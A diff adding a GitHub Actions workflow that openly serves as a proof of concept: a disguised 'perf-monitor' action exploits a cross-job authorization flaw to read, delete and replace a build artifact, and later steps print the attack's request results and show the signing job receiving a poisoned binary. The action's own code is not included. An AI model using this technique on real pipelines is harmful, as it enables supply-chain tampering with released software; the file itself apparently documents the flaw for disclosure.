@@ -1,0 +1,122 @@
+name: CompromisedAction-RealWorldPoC
+# Demonstrates: a developer adds perf-monitor action to their build workflow.
+# The action looks harmless. It silently exploits cross-job BOLA to steal and
+# poison the artifacts from the build job — without the developer knowing.
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+
+  # ── VICTIM JOB ──────────────────────────────────────────────────────────────
+  # This is a normal build job. Developer wrote this honestly.
+  # It compiles the binary and uploads it for the signing job to consume.
+  job-build-legitimate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Compile terraform binary (legitimate build step)
+        run: |
+          mkdir -p /tmp/terraform_dist
+          cat > /tmp/terraform_dist/terraform << 'EOF'
+          #!/bin/bash
+          # LEGITIMATE terraform v1.9.0 linux/amd64
+          # SHA256: a9f3a4b2c1d5e6f7...
+          # Build date: 2026-05-27T21:00:00Z
+          # Signed-off: release-team@hashicorp.com
+          echo "Terraform v1.9.0"
+          EOF
+          chmod +x /tmp/terraform_dist/terraform
+          cd /tmp && zip terraform_1.9.0_linux_amd64.zip terraform_dist/terraform
+          echo "Built: $(wc -c < /tmp/terraform_1.9.0_linux_amd64.zip) bytes"
+
+      - name: Upload build artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: terraform_1.9.0_linux_amd64.zip
+          path: /tmp/terraform_1.9.0_linux_amd64.zip
+
+  # ── ATTACKER JOB ────────────────────────────────────────────────────────────
+  # Developer added `perf-monitor` action to track build timing.
+  # Looks completely innocent. Runs AFTER build (needs:).
+  # Hidden: perf-monitor's index.js silently exploits BOLA.
+  job-perf-monitor:
+    runs-on: ubuntu-latest
+    needs: job-build-legitimate
+    steps:
+      - name: Checkout (needed to use local action)
+        uses: actions/checkout@v4
+
+      - name: Install action dependencies
+        run: cd .github/actions/perf-monitor && npm install --save @actions/core 2>/dev/null || true
+
+      - name: Monitor build performance
+        uses: ./.github/actions/perf-monitor
+        with:
+          artifact-name: terraform_1.9.0_linux_amd64.zip
+
+      - name: Show what the action did internally
+        run: |
+          echo "========================================"
+          echo "WHAT perf-monitor DID BEHIND THE SCENES"
+          echo "========================================"
+          echo ""
+          echo "--- Artifact enumeration result ---"
+          cat /tmp/PM_LIST_RESP.txt 2>/dev/null | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          for a in d.get('artifacts',[]):
+            print(f\"  name={a['name']} job_id={a['workflow_job_run_backend_id'][:8]}...\")
+          " 2>/dev/null || cat /tmp/PM_LIST_RESP.txt 2>/dev/null || echo "no list resp"
+          echo ""
+          echo "--- Victim artifact ---"
+          echo "  name: $(cat /tmp/PM_VICTIM_NAME.txt 2>/dev/null)"
+          echo ""
+          echo "--- GetSignedArtifactURL (BOLA READ) ---"
+          cat /tmp/PM_SIGNED_RESP.txt 2>/dev/null | grep "HTTP=" || echo "no signed resp"
+          echo "  stolen size: $(cat /tmp/PM_STOLEN_SIZE.txt 2>/dev/null) bytes"
+          echo ""
+          echo "--- DeleteArtifact (BOLA DELETE) ---"
+          cat /tmp/PM_DEL_RESP.txt 2>/dev/null | grep -v "signed" || echo "no del resp"
+          echo ""
+          echo "--- CreateArtifact + Upload + Finalize (INJECT) ---"
+          cat /tmp/PM_CREATE_RESP.txt 2>/dev/null | grep "HTTP=" || echo "no create resp"
+          echo "  blob upload: $(cat /tmp/PM_UPLOAD_HTTP.txt 2>/dev/null)"
+          cat /tmp/PM_FINALIZE_RESP.txt 2>/dev/null | grep -v "signed" || echo "no finalize resp"
+          echo ""
+          echo "========================================"
+
+  # ── SIGNING JOB (VICTIM) ────────────────────────────────────────────────────
+  # Developer wrote this to download the build artifact and sign it for release.
+  # It runs after perf-monitor. Gets poisoned binary instead of legitimate one.
+  job-sign-and-release:
+    runs-on: ubuntu-latest
+    needs: job-perf-monitor
+    steps:
+      - name: Download terraform binary for signing
+        uses: actions/download-artifact@v4
+        with:
+          name: terraform_1.9.0_linux_amd64.zip
+          path: /tmp/to-sign/
+
+      - name: Sign and verify binary (what real sign job does)
+        run: |
+          echo "========================================"
+          echo "SIGNING JOB RECEIVED:"
+          ls -la /tmp/to-sign/
+          echo ""
+          echo "Binary contents:"
+          find /tmp/to-sign -type f | xargs cat 2>/dev/null
+          echo ""
+          echo "Artifact came from job:"
+          ls /tmp/to-sign/
+          echo ""
+          if ls /tmp/to-sign/ | grep -q "pm_poison\|malicious\|INJECTED\|POISON"; then
+            echo "STATUS: *** POISONED BINARY — would be signed and released to users ***"
+          elif ls /tmp/to-sign/ | grep -q "terraform_dist"; then
+            echo "STATUS: LEGITIMATE binary — original from build job"
+          else
+            echo "STATUS: UNKNOWN — inspect contents above"
+          fi
+          echo "========================================"
